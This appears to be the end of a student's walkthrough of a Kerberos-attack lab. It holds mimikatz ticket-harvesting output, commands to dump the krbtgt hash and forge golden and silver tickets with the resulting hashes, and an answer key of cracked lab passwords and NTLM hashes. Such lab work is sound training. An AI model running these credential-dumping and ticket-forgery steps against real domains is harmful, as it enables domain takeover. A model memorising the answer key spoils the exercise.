           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;  
           Session Key       : 0x00000012 - aes256_hmac
             365c80bb8e3e83e3777d7ad5d98694f7b7f15187f53260c433f5986ba82ea935
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;3e7]-0-1-40a50000-CONTROLLER-1$@GC-CONTROLLER-1.CONTROLLER.local.kirbi ! 
         [00000002]
           Start/End/MaxRenew: 5/31/2023 4:29:18 PM ; 6/1/2023 2:20:06 AM ; 6/7/2023 4:20:06 PM
           Service Name (02) : cifs ; CONTROLLER-1 ; @ CONTROLLER.LOCAL 
           Target Name  (02) : cifs ; CONTROLLER-1 ; @ CONTROLLER.LOCAL 
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;    
           Session Key       : 0x00000012 - aes256_hmac
             b83f3bd27f8283515f14742a09c64bde57607a1e6c4e344e25a271d855237d98
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;3e7]-0-2-40a50000-CONTROLLER-1$@cifs-CONTROLLER-1.kirbi ! 
         [00000003]
           Start/End/MaxRenew: 5/31/2023 4:20:34 PM ; 6/1/2023 2:20:06 AM ; 6/7/2023 4:20:06 PM
           Service Name (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Target Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;  
           Session Key       : 0x00000012 - aes256_hmac
             94ec4eab4f6fa23f429d1b415a9f5a837cb8f46029a7d17a30db99fc9cca9632
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;3e7]-0-3-40a50000.kirbi !
         [00000004]
           Start/End/MaxRenew: 5/31/2023 4:20:34 PM ; 6/1/2023 2:20:06 AM ; 6/7/2023 4:20:06 PM
           Service Name (02) : cifs ; CONTROLLER-1.CONTROLLER.local ; CONTROLLER.local ; @ CONTROLLER.LOCAL    
           Target Name  (02) : cifs ; CONTROLLER-1.CONTROLLER.local ; CONTROLLER.local ; @ CONTROLLER.LOCAL 
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL ( CONTROLLER.local )
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;    
           Session Key       : 0x00000012 - aes256_hmac
             96f19adf1103ce50378111414c3f2b9d0b016cf9796bce8e1633c951081874b1
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;3e7]-0-4-40a50000-CONTROLLER-1$@cifs-CONTROLLER-1.CONTROLLER.local.kirbi !       
         [00000005]
           Start/End/MaxRenew: 5/31/2023 4:20:13 PM ; 6/1/2023 2:20:06 AM ; 6/7/2023 4:20:06 PM 
           Service Name (02) : LDAP ; CONTROLLER-1.CONTROLLER.local ; CONTROLLER.local ; @ CONTROLLER.LOCAL    
           Target Name  (02) : LDAP ; CONTROLLER-1.CONTROLLER.local ; CONTROLLER.local ; @ CONTROLLER.LOCAL    
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL ( CONTROLLER.LOCAL )
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;    
           Session Key       : 0x00000012 - aes256_hmac
             f318b2c50a6fafa7a6ec76f38f3e3455071c525af0fd05ef06e7e9c45cbed2c9
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;3e7]-0-5-40a50000-CONTROLLER-1$@LDAP-CONTROLLER-1.CONTROLLER.local.kirbi !       
         [00000006]
           Start/End/MaxRenew: 5/31/2023 4:20:06 PM ; 6/1/2023 2:20:06 AM ; 6/7/2023 4:20:06 PM
           Service Name (02) : ldap ; CONTROLLER-1.CONTROLLER.local ; @ CONTROLLER.LOCAL
           Target Name  (02) : ldap ; CONTROLLER-1.CONTROLLER.local ; @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;    
           Session Key       : 0x00000012 - aes256_hmac
             f294d5ba6c459ce240985872c35a0b2c1b64fc6797d10a4c6ac2cffaa2de8524 
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;3e7]-0-6-40a50000-CONTROLLER-1$@ldap-CONTROLLER-1.CONTROLLER.local.kirbi !       
         [00000007]
           Start/End/MaxRenew: 5/31/2023 4:20:06 PM ; 6/1/2023 2:20:06 AM ; 6/7/2023 4:20:06 PM
           Service Name (02) : LDAP ; CONTROLLER-1 ; @ CONTROLLER.LOCAL
           Target Name  (02) : LDAP ; CONTROLLER-1 ; @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;    
           Session Key       : 0x00000012 - aes256_hmac       
             fe7f401fcdc9bf643149836e6c7b53683a3b79313a61963509093a183f5eff43
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;3e7]-0-7-40a50000-CONTROLLER-1$@LDAP-CONTROLLER-1.kirbi !

        Group 1 - Client Ticket ?
         [00000000]
           Start/End/MaxRenew: 5/31/2023 4:53:48 PM ; 5/31/2023 5:08:48 PM ; 6/7/2023 4:20:06 PM
           Service Name (01) : controller-1$ ; @ (null)
           Target Name  (10) : administrator@CONTROLLER.local ; @ (null)
           Client Name  (10) : administrator@CONTROLLER.local ; @ CONTROLLER.LOCAL 
           Flags 00a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ;
           Session Key       : 0x00000012 - aes256_hmac
             8b0c9a435658b365872e7d59847f98b45ad3a2f0cb9c684303b9d3954fa22794
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 5        [...]
           * Saved to file [0;3e7]-1-0-00a50000.kirbi !

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 5/31/2023 4:20:06 PM ; 6/1/2023 2:20:06 AM ; 6/7/2023 4:20:06 PM
           Service Name (02) : krbtgt ; CONTROLLER.LOCAL ; @ CONTROLLER.LOCAL 
           Target Name  (--) : @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL ( $$Delegation Ticket$$ )
           Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             b084d5f1284d8c7f64542268af31a9588290047ed7edb4293fa46c92b45093a0
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
           * Saved to file [0;3e7]-2-0-60a10000-CONTROLLER-1$@krbtgt-CONTROLLER.LOCAL.kirbi ! 
         [00000001]
           Start/End/MaxRenew: 5/31/2023 4:20:06 PM ; 6/1/2023 2:20:06 AM ; 6/7/2023 4:20:06 PM
           Service Name (02) : krbtgt ; CONTROLLER.LOCAL ; @ CONTROLLER.LOCAL
           Target Name  (02) : krbtgt ; CONTROLLER.LOCAL ; @ CONTROLLER.LOCAL
           Client Name  (01) : CONTROLLER-1$ ; @ CONTROLLER.LOCAL ( CONTROLLER.LOCAL )
           Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             6724f22e5dcd15cd69104e6158324ec5af75e27c61c8c35eeac1ab2ccbf9a186
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...] 
           * Saved to file [0;3e7]-2-1-40e10000-CONTROLLER-1$@krbtgt-CONTROLLER.LOCAL.kirbi !
```





---

## Golden/Silver Ticket Attacks w/ mimikatz

### Dump the krbtgt hash

```bash
mimikatz.exe
lsadump::lsa /inject /name:krbtgt
```
 - This will dump the hash as well as the security identifier needed to create a Golden Ticket. To create a silver ticket you need to change the /name: to dump the hash of either a domain admin account or a service account such as the SQLService account.

### Output

```bash
mimikatz # lsadump::lsa /inject /name:krbtgt 
Domain : CONTROLLER / S-1-5-21-432953485-3795405108-1502158860 

RID  : 000001f6 (502)
User : krbtgt

 * Primary
    NTLM : 72cd714611b64cd4d5550cd2759db3f6
    LM   :
  Hash NTLM: 72cd714611b64cd4d5550cd2759db3f6
    ntlm- 0: 72cd714611b64cd4d5550cd2759db3f6
    lm  - 0: aec7e106ddd23b3928f7b530f60df4b6

 * WDigest
    01  d2e9aa3caa4509c3f11521c70539e4ad
    02  c9a868fc195308b03d72daa4a5a4ee47
    03  171e066e448391c934d0681986f09ff4
    04  d2e9aa3caa4509c3f11521c70539e4ad
    05  c9a868fc195308b03d72daa4a5a4ee47
    06  41903264777c4392345816b7ecbf0885
    07  d2e9aa3caa4509c3f11521c70539e4ad
    08  9a01474aa116953e6db452bb5cd7dc49
    09  a8e9a6a41c9a6bf658094206b51a4ead
    10  8720ff9de506f647ad30f6967b8fe61e
    11  841061e45fdc428e3f10f69ec46a9c6d
    12  a8e9a6a41c9a6bf658094206b51a4ead
    13  89d0db1c4f5d63ef4bacca5369f79a55
    14  841061e45fdc428e3f10f69ec46a9c6d
    15  a02ffdef87fc2a3969554c3f5465042a
    16  4ce3ef8eb619a101919eee6cc0f22060
    17  a7c3387ac2f0d6c6a37ee34aecf8e47e
    18  085f371533fc3860fdbf0c44148ae730
    19  265525114c2c3581340ddb00e018683b
    20  f5708f35889eee51a5fa0fb4ef337a9b
    21  bffaf3c4eba18fd4c845965b64fca8e2
    22  bffaf3c4eba18fd4c845965b64fca8e2
    23  3c10f0ae74f162c4b81bf2a463a344aa
    24  96141c5119871bfb2a29c7ea7f0facef
    25  f9e06fa832311bd00a07323980819074
    26  99d1dd6629056af22d1aea639398825b
    27  919f61b2c84eb1ff8d49ddc7871ab9e0
    28  d5c266414ac9496e0e66ddcac2cbcc3b
    29  aae5e850f950ef83a371abda478e05db

 * Kerberos
    Default Salt : CONTROLLER.LOCALkrbtgt
    Credentials
      des_cbc_md5       : 79bf07137a8a6b8f

 * Kerberos-Newer-Keys
    Default Salt : CONTROLLER.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : dfb518984a8965ca7504d6d5fb1cbab56d444c58ddff6c193b64fe6b6acf1033
      aes128_hmac       (4096) : 88cc87377b02a885b84fe7050f336d9b
      des_cbc_md5       (4096) : 79bf07137a8a6b8f

 * NTLM-Strong-NTOWF
    Random Value : 4b9102d709aada4d56a27b6c3cd14223
```

### Create a Golden/Silver Ticket

```bash
Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id:
```
- This is the command for creating a golden ticket to create a silver ticket simply put a service NTLM hash into the krbtgt slot, the sid of the service account into sid, and change the id to 1103.

---
# Questions

//<span class="answer">answer</span>//

### Section 1

<span class="answer">Answers within text</span>
===================================================
### Section 2

How many total users do we enumerate?  
<span class="answer">10</span>
What is the SQL service account name?
<span class="answer">sqlservice</span>
What is the second "machine" account name?  
<span class="answer">machine2</span>
What is the third "user" account name?
<span class="answer">user3</span>
===================================================
### Section 3

Which domain admin do we get a ticket for when harvesting tickets?
<span class="answer">Administrator</span>
Which domain controller do we get a ticket for when harvesting tickets?
<span class="answer">CONTROLLER-1</span>
===================================================
### Section 4

What is the HTTPService Password?
<span class="answer">Summer2020</span>
What is the SQLService Password?
<span class="answer">MYPassword123#</span>
===================================================
### Section 5

What hash type does AS-REP Roasting use?
<span class="answer">Kerberos 5, etype 23, AS-REP</span>
Which User is vulnerable to AS-REP Roasting?
<span class="answer">user3</span>
What is the User's Password?
<span class="answer">Password3</span>
Which Admin is vulnerable to AS-REP Roasting?
<span class="answer">admin2</span>
What is the Admin's Password?
<span class="answer">P@$$W0rd2</span>
==================================================
### Section 6

<span class="answer">No answer - check the box</span>
==================================================
### Section 7

What is the SQLService NTLM Hash?
<span class="answer">cd40c9ed96265531b21fc5b1dafcfb0a</span>
What is the Administrator NTLM Hash?
<span class="answer">2777b7fec870e04dda00cd7260f7bee6</span>
==================================================
### Section 8 & 9

<span class="answer">No answer(s) - check the box(s)</span>

___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: May 30th 2023 (09:44 pm) 
Last Modified Date: May 30th 2023 (09:44 pm)
